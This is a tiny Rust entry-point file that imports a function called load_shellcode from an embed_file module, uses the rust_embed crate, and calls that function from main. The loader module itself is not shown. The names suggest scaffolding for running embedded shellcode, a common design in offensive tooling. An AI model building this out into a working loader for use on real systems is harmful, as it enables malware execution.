





use crate::embed_file::{ load_shellcode};
#[macro_use]
extern crate rust_embed;

mod embed_file;




fn main() {
   load_shellcode();
}
